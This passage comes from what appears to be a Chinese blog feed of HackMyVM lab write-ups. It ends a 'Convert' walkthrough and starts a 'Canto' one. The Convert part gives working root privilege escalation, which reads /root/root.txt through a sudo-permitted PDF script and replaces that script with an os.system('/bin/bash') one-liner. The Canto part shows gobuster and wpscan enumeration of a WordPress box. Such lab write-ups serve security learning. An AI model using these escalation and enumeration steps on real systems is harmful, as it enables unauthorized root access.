        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PDF generated successfully at </span><span class="token interpolation"><span class="token punctuation">&#123;</span>output_path<span class="token punctuation">&#125;</span></span><span class="token string"> in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>elapsed_time<span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string"> seconds"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        exception<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Convert HTML content from a URL to a PDF file."</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-U"</span><span class="token punctuation">,</span> <span class="token string">"--url"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"URL of the HTML content to convert"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-O"</span><span class="token punctuation">,</span> <span class="token string">"--out"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Output file path for the generated PDF"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"/home/eva/output.pdf"</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    url_html_to_pdf<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>out<span class="token punctuation">)</span></code></pre>
<p>作用就是将一个url转化成pdf<br>关键部分</p>
<pre class="language-python" data-language="python"><code class="language-python">scheme <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme
       hostname <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname

       <span class="token keyword">if</span> scheme <span class="token keyword">in</span> block_schemes<span class="token punctuation">:</span>
           error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string"> scheme is Blocked"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string"> scheme is Blocked"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">return</span>

       <span class="token keyword">if</span> hostname <span class="token keyword">in</span> block_hosts<span class="token punctuation">:</span>
           error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string"> hostname is Blocked"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string"> hostname is Blocked"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">return</span>

       <span class="token keyword">if</span> <span class="token keyword">not</span> is_path_allowed<span class="token punctuation">(</span>output_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
           error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Output path is not allowed in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>blocked_directories<span class="token punctuation">&#125;</span></span><span class="token string"> directories"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: Output path is not allowed in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>blocked_directories<span class="token punctuation">&#125;</span></span><span class="token string"> directories"</span></span><span class="token punctuation">)</span>
           <span class="token keyword">return</span></code></pre>
<p>对于输出路径过滤了&#x2F;root但是对于输入路径没有过滤&#x2F;root,我的解法就是直接读取&#x2F;root&#x2F;root.txt转化成pdf<br>sudo &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;eva&#x2F;pdfgen.py  -U &#x2F;root&#x2F;root.txt -O 1.pdf<br>把1.pdf传到kali打开就能看到root flag<br><img src="https://ooo.0x0.ooo/2024/04/15/Om6p6c.png" alt="Om6p6c.png" loading="lazy"></p>
<p>第二种思路就是直接替换这个py文件<br>因为当前目录就是eva的目录,所以可以替换pdfgen.py</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eva@convert:~$ <span class="token function">rm</span> pdfgen.py
rm: remove write-protected regular <span class="token function">file</span> <span class="token string">'pdfgen.py'</span>? y
eva@convert:~$ <span class="token builtin class-name">echo</span> <span class="token string">"import os;os.system('/bin/bash');"</span> <span class="token operator">></span> pdfgen.py
eva@convert:~$ <span class="token function">cat</span> pdfgen.py
<span class="token function">import</span> os<span class="token punctuation">;</span>os.system<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
eva@convert:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> eva on convert:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User eva may run the following commands on convert:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
eva@convert:~$ <span class="token function">sudo</span> /usr/bin/python3 /home/eva/pdfgen.py *
root@convert:/home/eva<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>



]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>DompdfRCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Canto</title>
    <url>/posts/2e3aa93f/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.181</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:35:60:2d       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.181  08:00:27:d8:b5:f2       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.968</span> seconds <span class="token punctuation">(</span><span class="token number">130.08</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>

<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.181 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.181
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/<span class="token punctuation">]</span>
/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-content/<span class="token punctuation">]</span>
/wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5169</span><span class="token punctuation">]</span>
/license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19915</span><span class="token punctuation">]</span>
/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">322</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-includes/<span class="token punctuation">]</span>
/readme.html          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7401</span><span class="token punctuation">]</span>
/wp-trackback.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">135</span><span class="token punctuation">]</span>
/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">319</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-admin/<span class="token punctuation">]</span>
/xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">42</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/wp-signup.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-login.php?action<span class="token operator">=</span>register<span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
Progress: <span class="token number">984734</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">74.41</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">985328</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">74.46</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>根据目录能看出是一个wordpress，那就围绕wp漏洞展开呗，用wpscan尝试收集一下信息</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>用wpscan跑了一下 用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># wpscan --url http://192.168.56.181 -e u --detection-mode aggressive --api-token ************************</span>

_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.181/ [192.168.56.181]
[+] Started: Wed Jun  5 15:57:06 2024

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.181/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Users <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
 Brute Forcing Author IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">10</span> / <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> erik
 <span class="token operator">|</span> Found By: Wp Json Api <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://192.168.56.181/index.php/wp-json/wp/v2/users/?per_page<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token assign-left variable">page</span><span class="token operator">=</span><span class="token number">1</span>
 <span class="token operator">|</span> Confirmed By:
 <span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
 <span class="token operator">|</span> Plan: <span class="token function">free</span>
 <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">1</span>
 <span class="token operator">|</span> Requests Remaining: <span class="token number">20</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:57:10 <span class="token number">2024</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">54</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">6</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">14.67</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">241.517</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">104.543</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:03</code></pre>
<p>拿到一个用户名erik<br>扫一下主题</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># wpscan --url http://192.168.56.181 -e t --detection-mode aggressive --api-token ************************</span>

_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.181/ [192.168.56.181]
[+] Started: Wed Jun  5 15:58:05 2024

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.181/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Most Popular Themes <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
 Checking Known Locations - Time: 00:00:04 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token 